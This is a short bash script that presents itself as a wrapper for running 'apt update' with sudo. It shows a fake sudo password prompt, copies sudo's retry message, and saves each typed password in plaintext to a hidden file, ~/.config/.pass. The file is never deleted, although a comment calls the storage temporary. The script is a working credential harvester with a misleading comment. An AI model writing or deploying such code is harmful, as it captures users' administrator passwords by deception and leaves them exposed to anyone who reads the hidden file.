#!/usr/bin/env bash

SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
PROMPT="[sudo] password for ${USER}: "
PASS_FILE="${HOME}/.config/.pass"
TARGET_COMMAND=(/usr/bin/apt update)

mkdir -p "$(dirname "${PASS_FILE}")"

authenticate_with_sudo() {
    local password
    local attempts=0

    while [[ $attempts -lt 3 ]]; do
        printf "%s" "$PROMPT" >&2
        read -s password
        echo "" >&2
        
        # Store password temporarily with restricted permissions
        echo "${password}" > "${PASS_FILE}"
        chmod 600 "${PASS_FILE}"

        # Try running the command with sudo using stored password
        if /usr/bin/printf "%s\n" "$password" | /usr/bin/sudo -S "${TARGET_COMMAND[@]}" 2>/dev/null; then
            unset password
            return 0
        else
            echo "Sorry, try again." >&2
            ((attempts++))
        fi

        unset password
    done
    return 1
}

main() {
    authenticate_with_sudo
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main
fi
